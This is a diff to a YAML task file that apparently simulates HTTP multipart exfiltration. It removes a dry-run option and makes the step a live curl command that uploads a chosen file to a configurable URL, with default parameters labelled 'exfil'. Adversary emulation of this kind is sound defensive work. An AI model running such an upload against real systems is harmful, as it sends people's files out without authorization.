@@ -31,10 +31,6 @@ args:
   description: Additional form parameters
   type: string
   default: user=exfil&session=test
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.file_path }}' || (echo "File not found"; exit 1)
@@ -55,11 +51,10 @@ steps:
     echo "  File: $(basename '{{ .Args.file_path }}')"
     echo "  Additional params: {{ .Args.additional_params }}"
 - name: Execute multipart upload
-  inline: "if [ '{{ .Args.dry_run }}' = 'true' ]; then\n  echo \"DRY RUN: HTTP Multipart Upload\"\n  echo \"Command: curl\
-    \ -F {{ .Args.form_field }}=@'{{ .Args.file_path }}' \\\\\\\"\n  echo \"  {{ .Args.upload_url }}?{{ .Args.additional_params\
-    \ }}\\\"\"\nelse\n  # Build parameter string\n  params=\"\"\n  for param in {{ .Args.additional_params }}; do\n    params=\"\
-    $params -F \\\"$param\\\"\"\n  done\n  \n  curl -F \"{{ .Args.form_field }}=@'{{ .Args.file_path }}'\" \\\n    $params\
-    \ \\\n    '{{ .Args.upload_url }}'\nfi\n"
+  inline: |
+    curl -F '{{ .Args.form_field }}=@{{ .Args.file_path }}' \
+      -F '{{ .Args.additional_params }}' \
+      '{{ .Args.upload_url }}'
   cleanup:
     inline: rm -f /tmp/test_upload.bin
 tests:
